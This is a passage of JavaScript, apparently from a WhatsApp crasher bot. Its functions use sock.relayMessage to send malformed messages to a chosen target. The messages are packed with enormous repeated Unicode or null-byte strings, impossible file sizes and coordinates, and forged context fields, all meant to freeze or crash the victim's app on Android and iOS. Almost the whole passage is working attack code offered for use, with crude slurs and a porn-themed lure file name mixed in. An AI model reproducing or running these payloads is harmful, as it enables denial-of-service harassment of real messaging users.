await sock.relayMessage(target, messagePayload, {
additionalNodes: stanza,
participant: { jid : target }
});
}

async function PannOfficiaLXFreeze(target, ptcp = true) {
const stanza = [
{
attrs: { biz_bot: '1' },
tag: "bot",
},
{
attrs: {},
tag: "biz",
},
];

let messagePayload = {
viewOnceMessage: {
message: {
listResponseMessage: {
title: "Its Me PannOfficiaLX ><" + "ꦽ".repeat(45000),
listType: 2,
singleSelectReply: {
    selectedRowId: "❄"
},
contextInfo: {
stanzaId: sock.generateMessageTag(),
participant: "0@s.whatsapp.net",
remoteJid: "status@broadcast",
mentionedJid: [target, "13135550002@s.whatsapp.net"],
quotedMessage: {
                buttonsMessage: {
                    documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                        fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                        fileLength: "9999999999999",
                        pageCount: 3567587327,
                        mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                        fileName: "KataMaafMembunuhMu𓂾",
                        fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                        directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1735456100",
                        contactVcard: true,
                        caption: "sebuah kata maaf takkan membunuhmu, rasa takut bisa kau hadapi"
                    },
                    contentText: "- Kami Yo \"👋\"",
                    footerText: "© PannOfficiaL",
                    buttons: [
                        {
                            buttonId: "\u0000".repeat(850000),
                            buttonText: {
                                displayText: "PannOfficiaL͢X͟"
                            },
                            type: 1
                        }
                    ],
                    headerType: 3
                }
},
conversionSource: "porn",
conversionDelaySeconds: 9999,
forwardingScore: 999999,
isForwarded: true,
quotedAd: {
advertiserName: " x ",
mediaType: "IMAGE",
caption: " x "
},
placeholderKey: {
remoteJid: "0@s.whatsapp.net",
fromMe: false,
id: "ABCDEF1234567890"
},
expiration: -99999,
ephemeralSettingTimestamp: Date.now(),
entryPointConversionSource: "kontols",
entryPointConversionApp: "kontols",
actionLink: {
url: "t.me/xxxxxx",
buttonTitle: "konstol"
},
disappearingMode:{
initiator:1,
trigger:2,
initiatorDeviceJid: target,
initiatedByMe:true
},
groupSubject: "kontol",
parentGroupJid: "kontolll",
trustBannerType: "kontol",
trustBannerAction: 99999,
isSampled: true,
externalAdReply: {
title: "! Crasher - \"𝗋34\" 🩸",
mediaType: 2,
renderLargerThumbnail: false,
showAdAttribution: false,
containsAutoReply: false,
body: "Crashed Hardd",
sourceId: "Raurr",
ctwaClid: "cta",
ref: "ref",
sendToWhatsappCall: true,
automatedGreetingMessageShown: false,
greetingMessageBody: "kontol",
ctaPayload: "cta",
disableNudge: true,
originalImageUrl: "konstol"
},
featureEligibilities: {
cannotBeReactedTo: true,
cannotBeRanked: true,
canRequestFeedback: true
},
forwardedNewsletterMessageInfo: {
newsletterJid: "11111@newsletter",
serverMessageId: 1,
newsletterName: `- Kontol Mu Kecill 𖣂      - 〽${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
contentType: 3,
accessibilityText: "kontol"
},
statusAttributionType: 2,
utm: {
utmSource: "utm",
utmCampaign: "utm2"
}
},
description: "Dari PannOfficiaLX"
},
messageContextInfo: {
supportPayload: JSON.stringify({
version: 2,
is_ai_message: true,
should_show_system_message: true,
}),
},
}
}
}

await sock.relayMessage(target, messagePayload, {
additionalNodes: stanza,
participant: { jid : target }
});
}

async function Frezze(target, ptcp = true) {
const stanza = [
{
attrs: { biz_bot: '1' },
tag: "bot",
},
{
attrs: {},
tag: "biz",
},
];

let messagePayload = {
viewOnceMessage: {
message: {
listResponseMessage: {
title: "FannyFa Developer" + "ꦽ".repeat(45000),
listType: 2,
singleSelectReply: {
    selectedRowId: "❄"
},
contextInfo: {
stanzaId: sock.generateMessageTag(),
participant: "0@s.whatsapp.net",
remoteJid: "status@broadcast",
mentionedJid: [target, "13135550002@s.whatsapp.net"],
quotedMessage: {
                buttonsMessage: {
                    documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                        fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                        fileLength: "9999999999999",
                        pageCount: 3567587327,
                        mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                        fileName: "FannyFa𓂾",
                        fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                        directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1735456100",
                        contactVcard: true,
                        caption: "tidak ada bug yang gacor saat ini wkwk"
                    },
                    contentText: "- Kami Yo \"👋\"",
                    footerText: "© FannyFa",
                    buttons: [
                        {
                            buttonId: "\u0000".repeat(850000),
                            buttonText: {
                                displayText: "FannyFa͢X͟"
                            },
                            type: 1
                        }
                    ],
                    headerType: 3
                }
},
conversionSource: "porn",
conversionDelaySeconds: 9999,
forwardingScore: 999999,
isForwarded: true,
quotedAd: {
advertiserName: " x ",
mediaType: "IMAGE",
caption: " x "
},
placeholderKey: {
remoteJid: "0@s.whatsapp.net",
fromMe: false,
id: "ABCDEF1234567890"
},
expiration: -99999,
ephemeralSettingTimestamp: Date.now(),
entryPointConversionSource: "fannyfas",
entryPointConversionApp: "fannyfas",
actionLink: {
url: "t.me/fannyfa1124",
buttonTitle: "fannyfa"
},
disappearingMode:{
initiator:1,
trigger:2,
initiatorDeviceJid: target,
initiatedByMe:true
},
groupSubject: "fannyfa",
parentGroupJid: "fannyfall",
trustBannerType: "fannyfa",
trustBannerAction: 99999,
isSampled: true,
externalAdReply: {
title: "! FannyFa - \"𝗋34\" 🩸",
mediaType: 2,
renderLargerThumbnail: false,
showAdAttribution: false,
containsAutoReply: false,
body: "Crashed Hardd",
sourceId: "Raurr",
ctwaClid: "cta",
ref: "ref",
sendToWhatsappCall: true,
automatedGreetingMessageShown: false,
greetingMessageBody: "fannyfa",
ctaPayload: "cta",
disableNudge: true,
originalImageUrl: "fannyfa"
},
featureEligibilities: {
cannotBeReactedTo: true,
cannotBeRanked: true,
canRequestFeedback: true
},
forwardedNewsletterMessageInfo: {
newsletterJid: "11111@newsletter",
serverMessageId: 1,
newsletterName: `- FannyFa Developer      - 〽${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
contentType: 3,
accessibilityText: "fannyfa"
},
statusAttributionType: 2,
utm: {
utmSource: "utm",
utmCampaign: "utm2"
}
},
description: "FannyFa Developer"
},
messageContextInfo: {
supportPayload: JSON.stringify({
version: 2,
is_ai_message: true,
should_show_system_message: true,
}),
},
}
}
}

await sock.relayMessage(target, messagePayload, {
additionalNodes: stanza,
participant: { jid : target }
});
}
async function xeonHARD(target, ptcp = false) {
const gg = "ꦽ".repeat(10200);
const ggg = "ꦿꦾ".repeat(10200);
          sock.relayMessage(target, {
            viewOnceMessage: {
              message: {
                extendedTextMessage: {
                  text: " '  💥⃰͜͡⭑𝑷𝐚͢𝐧𝐧͢𝑶𝒇𝒇𝒊͢𝐜𝐢𝐚𝐥⭑͜͡💥'\n" + gg,
                  previewType: "💥⃰͜͡⭑𝑷𝐚͢𝐧𝐧͢𝑶𝒇𝒇𝒊͢𝐜𝐢𝐚𝐥⭑͜͡💥",
                  contextInfo: {
                    mentionedJid: ["6283896168476@s.whatsapp.net", "6283896168476@s.whatsapp.net"]
                  }
                }
              }
            }
          }, {
            participant: {
              jid: target
            }
          });
          await sock.relayMessage(target, {
            viewOnceMessage: {
              message: {
                interactiveMessage: {
                  body: {
                    text: "akujelek?"
                  },
                  footer: {
                    text: ""
                  },
                  header: {
                    documentMessage: {
                      url: "https://mmg.whatsapp.net/v/t62.7119-24/19973861_773172578120912_2263905544378759363_n.enc?ccb=11-4&oh=01_Q5AaIMqFI6NpAOoKBsWqUR52hN9p5YIGxW1TyJcHyVIb17Pe&oe=6653504B&_nc_sid=5e03e0&mms3=true",
                      mimetype: "application/pdf",
                      fileSha256: "oV/EME/ku/CjRSAFaW+b67CCFe6G5VTAGsIoimwxMR8=",
                      fileLength: null,
                      pageCount: 99999999999999,
                      contactVcard: true,
                      caption: "ᄃΛᄂIƧƬΛᄃЯΛƧΉ",
                      mediaKey: "yU8ofp6ZmGyLRdGteF7Udx0JE4dXbWvhT6X6Xioymeg=",
                      fileName: "ᄃΛᄂIƧƬΛᄃЯΛƧΉ ",
                      fileEncSha256: "0dJ3YssZD1YUMm8LdWPWxz2VNzw5icWNObWWiY9Zs3k=",
                      directPath: "/v/t62.7119-24/19973861_773172578120912_2263905544378759363_n.enc?ccb=11-4&oh=01_Q5AaIMqFI6NpAOoKBsWqUR52hN9p5YIGxW1TyJcHyVIb17Pe&oe=6653504B&_nc_sid=5e03e0",
                      mediaKeyTimestamp: "1714145232",
                      thumbnailDirectPath: "/v/t62.36145-24/32182773_798270155158347_7279231160763865339_n.enc?ccb=11-4&oh=01_Q5AaIGDA9WE26BzZF37Vp6aAsKq56VhpiK6Gdp2EGu1AoGd8&oe=665346DE&_nc_sid=5e03e0",
                      thumbnailSha256: "oFogyS+qrsnHwWFPNBmtCsNya8BJkTlG1mU3DdGfyjg=",
                      thumbnailEncSha256: "G2VHGFcbMP1IYd95tLWnpQRxCb9+Q/7/OaiDgvWY8bM=",
                      jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABERERESERMVFRMaHBkcGiYjICAjJjoqLSotKjpYN0A3N0A3WE5fTUhNX06MbmJiboyiiIGIosWwsMX46/j///8BERERERIRExUVExocGRwaJiMgICMmOiotKi0qOlg3QDc3QDdYTl9NSE1fToxuYmJujKKIgYiixbCwxfjr+P/////CABEIACIAYAMBIgACEQEDEQH/xAAwAAACAwEBAAAAAAAAAAAAAAADBAACBQYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAA5CpC5601s5+88/TJ01nBC6jmytPTAQuZhpxa2PQ0WjCP2T6LXLJR3Ma5WSIsDXtUZYkz2seRXNmSAY8m/PlhkUdZD//EAC4QAAIBAwIEBAQHAAAAAAAAAAECAAMRIRIxBCJBcQVRgbEQEzIzQmFygsHR4f/aAAgBAQABPwBKSsN4aZERmVVybZxecODVpEsCE2zmIhYgAZMbwjiQgbBNto9MqSCMwiUioJDehvaVBynIJ3xKPDki7Yv7StTC3IYdoLAjT/s0ltpSOhgSAR1BlTi7qUQTw/g3aolU4VTLzxLgg96yb9Yy2gJVgRLKgL1VtfZdyTKdXQrO246dB+UJJJJ3hRAoDWA84p+WRc3U9YANRmlT3nK9NdN9u1jKD1KeNTSsfnmzFiB5Eypw9ADUS4Hr/U1LT+1T9SPcmEaiWJ1N59BKrAcgNxfJ+BV25nNu8QlLE5WJj9J2mhTKTMjAX5SZTo0qYDsVJOxgalWauFtdeonE1NDW27ZEeqpz/F/ePUJHXuYfgxJqQfT6RPtfujE3pwdJQ5uDYNnB3nAABKlh+IzisvVh2hhg3n//xAAZEQACAwEAAAAAAAAAAAAAAAABIAACEWH/2gAIAQIBAT8AYDs16p//xAAfEQABAwQDAQAAAAAAAAAAAAABAAIRICExMgMSQoH/2gAIAQMBAT8ALRERdYpc6+sLrIREUenIa/AuXFH/2Q==",
                      thumbnailHeight: 172,
                      thumbnailWidth: 480
                    },
                    hasMediaAttachment: true
                  },
                  nativeFlowMessage: {
                    buttons: [{
                      name: "single_select",
                      buttonParamsJson: JSON.stringify({
                        title: "ᄃΛᄂIƧƬΛᄃЯΛƧΉ",
                        sections: [{
                          title: "",
                          rows: [{
                            title: "ᄃΛᄂIƧƬΛᄃЯΛƧΉ",
                            id: ".huii"
                          }]
                        }]
                      })
                    }]
                  },
                  contextInfo: {
                    mentionedJid: target,
                    mentions: target
                  },
                  disappearingMode: {
                    initiator: "INITIATED_BY_ME",
                    inviteLinkGroupTypeV2: "DEFAULT",
                    messageContextInfo: {
                      deviceListMetadata: {
                        senderTimestamp: "1678285396",
                        recipientKeyHash: "SV5H7wGIOXqPtg==",
                        recipientTimestamp: "1678496731",
                        deviceListMetadataVersion: 2
                      }
                    }
                  }
                }
              }
            }
          }, {
            participant: {
              jid: target
            }
          });
          await sock.relayMessage(target, {
            viewOnceMessage: {
              message: {
                locationMessage: {
                  degreesLatitude: -21.980324912168495,
                  degreesLongitude: 24.549921490252018,
                  name: "ᄃΛᄂIƧƬΛᄃЯΛƧΉ" + ggg,
                  address: "",
                  jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAPwMBIgACEQEDEQH/xAAwAAACAwEBAAAAAAAAAAAAAAADBAACBQEGAQADAQEAAAAAAAAAAAAAAAABAgMABP/aAAwDAQACEAMQAAAAz2QAZ/Q57OSj+gLlnhnQdIBnhbzugXQZXcL6CF2XcIhqctQY3oMPokgQo6ArA2ZsVnlYUvnMq3lF7UfDKToz7SneaszZLzraR84aSDD7Jn//xAAhEAACAgIDAAMBAQAAAAAAAAABAgADBBESITETIkFRgf/aAAgBAQABPwAX2A2Op9MOSj1cbE7mEgqxy8NhsvDH+9RF12YGnFTLamPg3MnFONYFDbE+1liLx9MzXNVVdan8gdgVI/DEzlYaY9xbQRuJZyE5zKT5Mhj+ATGrUXDZ6EznJs3+RuvDOz3MXJRfo8+Sv1HE+xjsP2WMEfce5XUrv2MnoI6EJB8laAnuVUdgxelj1lpkE89Q7iO0ABGx/olNROyRE2hituW9IZah2TOBI7E48PYnEJsSm3YG4AGE4lfJk2a0sZuTdxiCpIjAOkLlQBqUOS2ojagOxMonmDOXsJHHqIdtLqSdESisq2yI2otnGZP2oVoDPNiBSBvUqO9SwdQGan//xAAdEQADAQADAAMAAAAAAAAAAAAAAQIRECExMkGB/9oACAECAQE/AMlpMXejivs2kydawnr0pKkWkvHpDOitzoeMldIw1OWNaR5+8P5cf//EAB0RAAIDAAIDAAAAAAAAAAAAAAERAAIQAxIgMVH/2gAIAQMBAT8Acpx2tXsIdZHowNwaPBF4M+Z//9k="
                }
              }
            }
          }, {
            participant: {
              jid: target
            }
          });
          await sock.relayMessage(target, {
            botInvokeMessage: {
              message: {
                messageContextInfo: {
                  deviceListMetadataVersion: 2,
                  deviceListMetadata: {}
                },
                interactiveMessage: {
                  nativeFlowMessage: {
                    buttons: [{
                      name: "payment_info",
                      buttonParamsJson: "{\"currency\":\"INR\",\"total_amount\":{\"value\":0,\"offset\":100},\"reference_id\":\"4PVSNK5RNNJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"pending\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"name\":\"\",\"amount\":{\"value\":0,\"offset\":100},\"quantity\":0,\"sale_amount\":{\"value\":0,\"offset\":100}}]},\"payment_settings\":[{\"type\":\"pix_static_code\",\"pix_static_code\":{\"merchant_name\":\"💥⃰͜͡⭑𝑷𝐚͢𝐧𝐧͢𝑶𝒇𝒇𝒊͢𝐜𝐢𝐚𝐥⭑͜͡💥\",\"key_type\":\"RANDOM\"}}]}"
                    }]
                  }
                }
              }
            }
          }, {
            participant: {
              jid: target
            }
          });
          await sock.relayMessage(target, {
            viewOnceMessage: {
              message: {
                liveLocationMessage: {
                  degreesLatitude: 11111111,
                  degreesLongitude: -111111,
                  caption: "xeontex",
                  url: "https://" + ggg + ".com",
                  sequenceNumber: "1678556734042001",
                  jpegThumbnail: null,
                  expiration: 7776000,
                  ephemeralSettingTimestamp: "1677306667",
                  disappearingMode: {
                    initiator: "INITIATED_BY_ME",
                    inviteLinkGroupTypeV2: "DEFAULT",
                    messageContextInfo: {
                      deviceListMetadata: {
                        senderTimestamp: "1678285396",
                        recipientKeyHash: "SV5H7wGIOXqPtg==",
                        recipientTimestamp: "1678496731",
                        deviceListMetadataVersion: 2
                      }
                    }
                  },
                  contextInfo: {
                    mentionedJid: target,
                    mentions: target,
                    isForwarded: true,
                    fromMe: false,
                    participant: "0@s.whatsapp.net",
                    remoteJid: "0@s.whatsapp.net"
                  }
                }
              }
            }
          }, {
            participant: {
              jid: target
            }
          });
        }
        
async function BlankScreen(target, Ptcp = false) {
  	const jids = `_*~@6285805338638~*_\n`.repeat(10200);
	const ui = 'ꦽ'.repeat(1500);
			await sock.relayMessage(target, {
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 1316134911,
										mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
										fileName: "sockXzo New",
										fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
										directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1726867151",
										contactVcard: true,
										jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAOQMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAACBAADBQEGAQADAQAAAAAAAAAAAAAAAAABAgMA/9oADAMBAAIQAxAAAAA87YUMO16iaVwl9FSrrywQPTNV2zFomOqCzExzltc8uM/lGV3zxXyDlJvj7RZJsPibRTWvV0qy7dOYo2y5aeKekTXvSVSwpCODJB//xAAmEAACAgICAQIHAQAAAAAAAAABAgADERIEITETUgUQFTJBUWEi/9oACAEBAAE/ACY7EsTF2NAGO49Ni0kmOIflmNSr+Gg4TbjvqaqizDX7ZJAltLqTlTCkKTWehaH1J6gUqMCBQcZmoBMKAjBjcep2xpLfh6H7TPpp98t5AUyu0WDoYgOROzG6MEAw0xENbHZ3lN1O5JfAmyZUqcqYSI1qjow2KFgIIyJq0Whz56hTQfcDKbioCmYbAbYYjaWdiIucZ8SokmwA+D1P9e6WmweWiAmcXjC5G9wh42HClusdxERBqFhFZUjWVKAGI/cysDknzK2wO5xbLWBVOpRVqSScmEfyOoCk/wAlC5rmgiyih7EZ/wACca96wcQc1wIvOs/IEfm71sNDFZxUuDPWf9z/xAAdEQEBAQACAgMAAAAAAAAAAAABABECECExEkFR/9oACAECAQE/AHC4vnfqXelVsstYSdb4z7jvlz4b7lyCfBYfl//EAB4RAAMBAAICAwAAAAAAAAAAAAABEQIQEiFRMWFi/9oACAEDAQE/AMtNfZjPW8rJ4QpB5Q7DxPkqO3pGmUv5MrU4hCv2f//Z",
									},
									hasMediaAttachment: true,
								},
								body: {
									text: "Freze" + jids + ui,
								},
								nativeFlowMessage: {},
								contextInfo: {
								mentionedJid: ["6285805338638@s.whatsapp.net"],
									forwardingScore: 1,
									isForwarded: true,
									fromMe: false,
									participant: "0@s.whatsapp.net",
									remoteJid: "status@broadcast",
									quotedMessage: {
										documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "9999999999999",
											pageCount: 1316134911,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "Bokep 18+",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAOQMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAACBAADBQEGAQADAQAAAAAAAAAAAAAAAAABAgMA/9oADAMBAAIQAxAAAAA87YUMO16iaVwl9FSrrywQPTNV2zFomOqCzExzltc8uM/lGV3zxXyDlJvj7RZJsPibRTWvV0qy7dOYo2y5aeKekTXvSVSwpCODJB//xAAmEAACAgICAQIHAQAAAAAAAAABAgADERIEITETUgUQFTJBUWEi/9oACAEBAAE/ACY7EsTF2NAGO49Ni0kmOIflmNSr+Gg4TbjvqaqizDX7ZJAltLqTlTCkKTWehaH1J6gUqMCBQcZmoBMKAjBjcep2xpLfh6H7TPpp98t5AUyu0WDoYgOROzG6MEAw0xENbHZ3lN1O5JfAmyZUqcqYSI1qjow2KFgIIyJq0Whz56hTQfcDKbioCmYbAbYYjaWdiIucZ8SokmwA+D1P9e6WmweWiAmcXjC5G9wh42HClusdxERBqFhFZUjWVKAGI/cysDknzK2wO5xbLWBVOpRVqSScmEfyOoCk/wAlC5rmgiyih7EZ/wACca96wcQc1wIvOs/IEfm71sNDFZxUuDPWf9z/xAAdEQEBAQACAgMAAAAAAAAAAAABABECECExEkFR/9oACAECAQE/AHC4vnfqXelVsstYSdb4z7jvlz4b7lyCfBYfl//EAB4RAAMBAAICAwAAAAAAAAAAAAABEQIQEiFRMWFi/9oACAEDAQE/AMtNfZjPW8rJ4QpB5Q7DxPkqO3pGmUv5MrU4hCv2f//Z",
										},
									},
								},
							},
						},
					},
				},
				Ptcp ? {
					participant: {
						jid: target
					}
				}:{}
			);
       }

async function systemUi(target, Ptcp = false) {
    sock.relayMessage(target, {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "👋" + "ꦾ".repeat(250000) + "@1".repeat(100000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "CoDe" }]
                    }
                }
            }
        }
    }, { participant: { jid: target, quoted: QBug } }, { messageId: null });
};
async function locasifreeze2(target, ptcp = false) {
    await sock.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "🌿͜͞𐊢ăŶ͜͝ɯʐʐ🌸" + "1".repeat(300000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: " xCeZeT " }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}
async function GlX(target, Ptcp = true) {
      await sock.relayMessage(
        target,
        {
          viewOnceMessage: {
            message: {
              interactiveResponseMessage: {
                body: {
                  text: "sockwzz",
                  format: "EXTENSIONS_1",
                },
                nativeFlowResponseMessage: {
                  name: "galaxy_message",
                  paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"Painzy 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"⿻ Staries Ni Boyy ⿻\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"⭑̤▾ ⿻ StariesNiboss ⿻ ▾⭑̤${"\u0000".repeat(
                    1020000
                  )}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                  version: 3,
                },
              },
            },
          },
        },
        Ptcp
          ? {
              participant: {
                jid: target,
              },
            }
          : {}
      );
      console.log(chalk.green("Send Bug By ⭑̤▾ ⿻ StariesPpk ⿻ ▾⭑"));
    }

async function Jade(target, ptcp = true) {
      let FlashD = "🌿͜͞𐊢ăŶ͜͝ɯʐʐ🌸" + "𑇂𑆵𑆴𑆿".repeat(50000) + "ꦽ".repeat(50000);
     await sock.relayMessage(
        target,
        {
          locationMessage: {
            degreesLatitude: 999.03499999999999,
            degreesLongitude: -999.03499999999999,
            name: FlashD,
            url: "https://t.me/sockwzzneh",
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

async function FBiphone(target) {
      await sock.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "FBPAY",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function QXIphone(target) {
      let CrashQAiphone = "𑇂𑆵𑆴𑆿".repeat(60000);
      await sock.relayMessage(
        target,
        {
          locationMessage: {
            degreesLatitude: 999.03499999999999,
            degreesLongitude: -999.03499999999999,
            name: CrashQAiphone,
            url: "https://t.me/socksta",
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function QPayIos(target) {
      await sock.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "PAYPAL",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function QPayStriep(target) {
      await sock.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "STRIPE",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function QDIphone(target) {
      sock.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: "ꦾ".repeat(55000),
            contextInfo: {
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation: "Maaf Kak" + "ꦾ࣯࣯".repeat(50000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        },
        {
          paymentInviteMessage: {
            serviceType: "UPI",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        },
        {
          messageId: null,
        }
      );
    }

    //

    async function IosMJ(target, Ptcp = false) {
      await sock.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: "Wanna With Yours :)" + "ꦾ".repeat(90000),
            contextInfo: {
              stanzaId: "1234567890ABCDEF",
              participant: "0@s.whatsapp.net",
              quotedMessage: {
                callLogMesssage: {
                  isVideo: true,
                  callOutcome: "1",
                  durationSecs: "0",
                  callType: "REGULAR",
                  participants: [
                    {
                      jid: "0@s.whatsapp.net",
                      callOutcome: "1",
                    },
                  ],
                },
              },
              remoteJid: target,
              conversionSource: "source_example",
              conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
              conversionDelaySeconds: 10,
              forwardingScore: 99999999,
              isForwarded: true,
              quotedAd: {
                advertiserName: "Example Advertiser",
